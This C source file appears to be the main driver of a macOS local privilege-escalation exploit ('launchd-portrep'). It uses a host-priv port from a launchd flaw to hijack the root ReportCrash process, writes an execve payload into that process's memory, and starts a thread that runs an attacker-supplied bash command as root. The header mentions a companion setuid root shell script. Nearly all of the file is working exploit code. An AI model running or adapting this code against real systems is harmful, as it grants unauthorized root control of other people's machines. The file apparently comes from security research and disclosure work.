/*
 * launchd-portrep
 * Brandon Azad
 *
 *
 * launchd-portrep
 * ================================================================================================
 *
 *  See launchd-portrep.c.
 *
 *
 * The vulnerability
 * ------------------------------------------------------------------------------------------------
 *
 *  See launchd-portrep.c.
 *
 *
 * Exploit strategy to get host-priv
 * ------------------------------------------------------------------------------------------------
 *
 *  See launchd-portrep-hostpriv.c.
 *
 *
 * Once we have host-priv
 * ------------------------------------------------------------------------------------------------
 *
 *  Once we have the host-priv port, we can control any task on the system. Once again I use the
 *  same strategy as Ian Beer's original exploit: hijack a root process and make it execute our
 *  exploit payload. This exploit targets the ReportCrash process running as root. Using the task
 *  port, we can allocate memory in the task's address space, copy in an exploit payload, and then
 *  create a new thread in ReportCrash to run the payload.
 *
 *  The easiest payload to run is to force the hijacked process to exec /bin/bash to run a command
 *  string. The command string is arbitrary: it is supplied on the command line. For example, the
 *  accompanying launchd-portrep-rootsh.sh script creates a setuid root shell launcher under /var.
 *
 */

#include "launchd-portrep.h"
#include "launchd-portrep-hostpriv.h"
#include "log.h"

#include <assert.h>
#include <libproc.h>
#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// ---- Logging -----------------------------------------------------------------------------------

// A log function to print the message to stdout in classic hacker style.
static void
log(char type, const char *format, va_list ap) {
	switch (type) {
		case 'I': type = '+'; break;
		case 'W': type = '!'; break;
		case 'E': type = '-'; break;
	}
	char *msg = NULL;
	vasprintf(&msg, format, ap);
	printf("[%c] %s\n", type, msg);
	free(msg);
}

// ---- Process functions -------------------------------------------------------------------------

// Find all PIDs of processes matching the specified path.
static bool
proc_list_pids_with_path(const char *path, pid_t **pids, size_t *count) {
	// Get the number of processes.
	int capacity = proc_listallpids(NULL, 0);
	if (capacity <= 0) {
fail_0:
		return false;
	}
	capacity += 24;
	assert(capacity > 0);
	// Get the list of all PIDs.
	pid_t all_pids[capacity];
	int all_count = proc_listallpids(all_pids, capacity * sizeof(*all_pids));
	if (all_count <= 0) {
		goto fail_0;
	}
	// Filter down the list to only those matching the specified path.
	size_t found = 0;
	for (int i = 0; i < all_count; i++) {
		pid_t pid = all_pids[i];
		// Get this process's path.
		char pid_path[MAXPATHLEN];
		int len = proc_pidpath(pid, pid_path, sizeof(pid_path));
		if (len <= 0) {
			continue;
		}
		// If it's a match, add it to the list and increment the number of PIDs found.
		if (strncmp(path, pid_path, len) == 0) {
			all_pids[found] = pid;
			found++;
		}
	}
	// Now that we know how many match, allocate the buffer we'll return to the user.
	pid_t *pids_array = malloc(found * sizeof(*pids));
	if (pids_array == NULL) {
		goto fail_0;
	}
	// We reverse the returned array because proc_listallpids seems to return the PIDs in
	// reverse order.
	for (int i = 0; i < found; i++) {
		pids_array[i] = all_pids[found - (i + 1)];
	}
	*pids  = pids_array;
	*count = found;
	return true;
}

// ---- Exploit logic to take control of a root process -------------------------------------------

// Get the task port for a process it should (hopefully) be safe for us to consume.
static mach_port_t
get_target_task(mach_port_t host_priv) {
	const char *path = "/System/Library/CoreServices/ReportCrash";
	const char *service = "com.apple.ReportCrash.DirectoryService";
	// First try to jump-start the process.
	bool started = launchd_start_service(service, true);
	if (!started) {
		ERROR("Could not start service %s", service);
	}
	// Sleep a little while to let it start up. I don't know why it isn't fully started by the
	// time it replies to us in launchd_start_service.
	usleep(400000);
	// Now try to find the process's PID.
	pid_t *pids;
	size_t pid_count;
	bool ok = proc_list_pids_with_path(path, &pids, &pid_count);
	if (!ok) {
		ERROR("Could not find PID for %s", path);
		return MACH_PORT_NULL;
	}
	// Filter the list of PIDs until we find a process running as root.
	bool found = false;
	pid_t pid;
	for (size_t i = 0; i < pid_count; i++) {
		pid = pids[i];
		struct proc_bsdshortinfo info;
		int err = proc_pidinfo(pid, PROC_PIDT_SHORTBSDINFO, 0, &info, sizeof(info));
		if (err <= 0) {
			continue;
		}
		if (info.pbsi_uid == 0) {
			found = true;
			break;
		}
	}
	free(pids);
	// Fail if none of the processes are root.
	if (!found) {
		ERROR("Could not find process %s running as root", path);
		return MACH_PORT_NULL;
	}
	// Get the task port.
	INFO("Hijacking process %d", pid);
	mach_port_t task = host_priv_task_for_pid(host_priv, pid);
	if (task == MACH_PORT_NULL) {
		ERROR("Could not get task for PID %d process %s", pid, path);
	}
	return task;
}

// Run our exploit payload in the target task. The exploit payload will attempt to copy 
static bool
run_payload(mach_port_t target_task, const char *bash_command) {
	//
	// We will execute:
	//
	//   char *argv[4] = { "/bin/bash", "-c", bash_command, NULL };
	//   execve("/bin/bash", argv, NULL)
	//
	// Our payload looks like:
	//
	//                            /--------------------------\
	//                   /--------|----------------------\   |
	//   /---------------|--------|------------------\   |   |
	//   v               v        v                  |   |   |
	//   +===============+========+================+=|=+=|=+=|=+======+=========+
	//   | "/bin/bash\0" | "-c\0" | <bash-command> | o | o | o | NULL |  stack  |
	//   +===============+========+================+===+===+===+======+=========+
	//   ^                                         ^                            ^
	//   "/bin/bash"                               argv                 stack ptr
	//
	const char *const bash_path = "/bin/bash";
	const char *const c_flag    = "-c";
	const char *const argv[] = { bash_path, c_flag, bash_command };
	const size_t argc = sizeof(argv) / sizeof(*argv);
	const size_t stack_size = 0x1000;
	// Get the size of the payload.
	size_t payload_size = stack_size;
	for (size_t i = 0; i < argc; i++) {
		payload_size += strlen(argv[i]) + 1;
	}
	payload_size += (argc + 1) * sizeof(void *);
	// Allocate our payload in the task.
	mach_vm_address_t payload_address;
	kern_return_t kr = mach_vm_allocate(target_task, &payload_address, payload_size,
			VM_FLAGS_ANYWHERE);
	if (kr != KERN_SUCCESS) {
		ERROR("Could not allocate memory in target task: %x", kr);
		return false;
	}
	// Build a local version of the payload.
	size_t initialized_payload_size = payload_size - stack_size;
	uint8_t *payload = malloc(initialized_payload_size);
	assert(payload != NULL);
	char *str = (char *) payload;
	uintptr_t payload_argv_element_address[argc];
	for (size_t i = 0; i < argc; i++) {
		payload_argv_element_address[i] = payload_address + ((uint8_t *) str - payload);
		str = stpcpy(str, argv[i]) + 1;
	}
	const void **payload_argv = (const void **) str;
	uintptr_t payload_argv_address = payload_address + ((uint8_t *) payload_argv - payload);
	for (size_t i = 0; i < argc; i++) {
		payload_argv[i] = (const void *)payload_argv_element_address[i];
	}
	payload_argv[argc] = NULL;
	// Copy the local version of the payload to the remote task.
	kr = mach_vm_write(target_task, payload_address, (mach_vm_address_t) payload,
			initialized_payload_size);
	free(payload);
	if (kr != KERN_SUCCESS) {
		mach_vm_deallocate(target_task, payload_address, payload_size);
		ERROR("Could not copy payload into target task: %x", kr);
		return false;
	}
	// Create a new thread to execute the payload.
	x86_thread_state64_t state = {};
	state.__rip = (uintptr_t) execve;
	state.__rdi = payload_argv_element_address[0];
	state.__rsi = payload_argv_address;
	state.__rdx = (uintptr_t) NULL;
	state.__rsp = payload_address + payload_size - 0x10;
	mach_port_t exploit_thread;
	kr = thread_create_running(target_task, x86_THREAD_STATE64, (thread_state_t) &state,
			x86_THREAD_STATE64_COUNT, &exploit_thread);
	if (kr != KERN_SUCCESS) {
		ERROR("Could not create exploit thread in target task: %x", kr);
		return false;
	}
	mach_port_deallocate(mach_task_self(), exploit_thread);
	return true;
}

int
main(int argc, const char *argv[]) {
	if (argc != 2) {
		printf("Usage: %s <bash-command-string>\n"
		       "Executes \"bash -c '<bash-command-string>'\" in a root process\n",
		       argv[0]);
		return 1;
	}
	log_implementation = log;
	// Run the exploit to get the host-priv port.
	mach_port_t host_priv = launchd_portrep_host_priv();
	if (host_priv == MACH_PORT_NULL) {
		return 1;
	}
	// Try to get the task port for a process we can consume with a call to execve().
	mach_port_t target_task = get_target_task(host_priv);
	mach_port_deallocate(mach_task_self(), host_priv);
	if (target_task == MACH_PORT_NULL) {
		return 1;
	}
	// Run our payload in the target task.
	bool ok = run_payload(target_task, argv[1]);
	mach_port_deallocate(mach_task_self(), target_task);
	if (!ok) {
		return 1;
	}
	return 0;
}
